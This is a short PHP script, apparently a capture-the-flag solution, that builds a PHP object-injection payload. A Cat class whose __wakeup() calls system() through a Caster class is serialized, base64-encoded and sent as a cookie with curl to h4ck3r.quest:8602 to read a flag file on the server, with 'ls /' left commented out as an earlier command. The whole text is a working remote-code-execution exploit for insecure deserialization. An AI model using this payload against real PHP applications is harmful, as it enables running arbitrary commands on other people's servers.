<?php
    class Caster
    {
        public $cast_func = 'system';
        function cast($val)
        {
            return ($this->cast_func)($val);
        }
    }
    class Cat
    {
        public $magic;
        public $spell;
        function __construct()
        {
            $this->magic = new Caster();
            //$this->spell = 'ls /';
            $this->spell = 'cat /flag_23907376917516c8';
        }
        function __wakeup()
        {
            echo "Cat Wakeup!\n";
            $this->magic->cast($this->spell);
        }
    }
    $cat = base64_encode(serialize(new Cat()));
    system("curl http://h4ck3r.quest:8602/ --cookie 'cat=".$cat."'");
?>